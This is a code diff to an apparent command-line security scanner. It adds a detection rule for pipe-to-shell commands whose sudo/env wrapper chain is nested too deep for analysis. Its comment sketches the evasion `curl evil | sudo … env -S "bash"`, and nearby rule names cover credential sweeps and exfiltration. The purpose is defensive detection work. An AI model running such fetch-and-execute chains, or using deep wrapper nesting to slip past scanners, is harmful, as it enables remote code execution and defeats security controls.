@@ -54,6 +54,20 @@ pub enum RuleId {
     CredentialFileSweep,
     Base64DecodeExecute,
     DataExfiltration,
+    /// M13 — a pipe SINK's interpreter could not be resolved because its wrapper
+    /// chain (`sudo` / `env -S` / `command` / `exec` / `nohup`) nests DEEPER than
+    /// the [`crate::rules`] `MAX_WRAPPER_DEPTH` (32) the interpreter resolver will
+    /// unwrap. Emitted by `check_pipe_to_interpreter` ONLY when resolution gives
+    /// up due to DEPTH-EXHAUSTION (a truncated chain) — not when a leader is
+    /// simply not an interpreter. Closes the silent evasion where
+    /// `curl evil | sudo …(×32)… env -S "bash"` (or a nested `env -S "env -S
+    /// \"…\""` payload) exhausts the budget so `CurlPipeShell`/`PipeToInterpreter`
+    /// never fires. Medium/Warn: an "obfuscated beyond tirith's analysis depth,
+    /// treat as suspicious" signal, not a confirmed exploit — failing toward a
+    /// VISIBLE finding is the honest behaviour for a security tool. Tier-1 rides
+    /// the existing `pipe_to_interpreter` PATTERN_TABLE entry (the literal sink
+    /// interpreter token plus the `| sudo`/`| env` fragment still trip it).
+    WrapperChainTooDeep,
     /// M5 item 16 — PowerShell `Set-ExecutionPolicy Bypass` (cmdlet or
     /// `powershell -ExecutionPolicy Bypass` flag form). Disables script
     /// signing enforcement so subsequent downloaded scripts run unsigned.
